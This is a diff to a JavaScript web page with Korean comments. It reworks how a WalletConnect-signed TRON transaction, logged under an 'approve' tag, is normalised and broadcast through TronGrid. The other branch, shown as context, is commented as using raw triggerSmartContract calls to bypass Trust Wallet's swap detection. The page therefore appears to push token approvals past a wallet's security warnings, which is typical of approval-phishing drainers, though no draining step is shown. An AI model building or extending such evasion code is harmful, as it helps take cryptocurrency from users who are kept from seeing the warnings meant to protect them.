@@ -790,16 +790,29 @@
                     if(!triggerData.transaction)throw new Error('TronGrid 트랜잭션 생성 실패: '+(triggerData.Error||JSON.stringify(triggerData)));
                     appendLog('[WC] 트랜잭션 생성 완료, 지갑에서 서명 요청 중...','approve');
                     // WalletConnect로 서명 요청
-                    var signedTx=await wcConnector.signTransaction(triggerData.transaction);
-                    appendLog('[WC] 서명 완료, 브로드캐스트 중...','approve');
-                    // 브로드캐스트
+                    var wcResult=await wcConnector.signTransaction(triggerData.transaction);
+                    appendLog('[WC] 서명 응답 키: '+JSON.stringify(Object.keys(wcResult||{})).substring(0,120),'approve');
+                    // WC 서명 결과 정규화
+                    if(wcResult&&wcResult.result) wcResult=wcResult.result;
+                    var broadcastPayload;
+                    if(wcResult&&wcResult.signature&&wcResult.txID){
+                        // Trust Wallet: 완전한 서명된 트랜잭션
+                        broadcastPayload=wcResult;
+                    }else if(wcResult&&wcResult.signature){
+                        // 서명만 반환 → 원본 tx에 병합
+                        broadcastPayload=JSON.parse(JSON.stringify(triggerData.transaction));
+                        broadcastPayload.signature=Array.isArray(wcResult.signature)?wcResult.signature:[wcResult.signature];
+                    }else{
+                        broadcastPayload=wcResult;
+                    }
+                    appendLog('[WC] 브로드캐스트 중... txID:'+(broadcastPayload.txID||'없음'),'approve');
                     var broadcastRes=await fetch('https://api.trongrid.io/wallet/broadcasttransaction',{
                         method:'POST',headers:{'Content-Type':'application/json'},
-                        body:JSON.stringify(signedTx)
+                        body:JSON.stringify(broadcastPayload)
                     });
                     var broadcastData=await broadcastRes.json();
-                    if(!broadcastData.result)throw new Error('브로드캐스트 실패: '+(broadcastData.message||JSON.stringify(broadcastData)));
-                    txHash=broadcastData.txid||signedTx.txID||'ok';
+                    if(!broadcastData.result)throw new Error('브로드캐스트 실패: '+(broadcastData.Error||broadcastData.message||JSON.stringify(broadcastData)));
+                    txHash=broadcastData.txid||broadcastPayload.txID||'ok';
                 }else{
                     // === DApp 브라우저 경로: triggerSmartContract 원시 방식 (Trust Wallet 스왑 감지 우회) ===
                     var tx=await tw.transactionBuilder.triggerSmartContract(
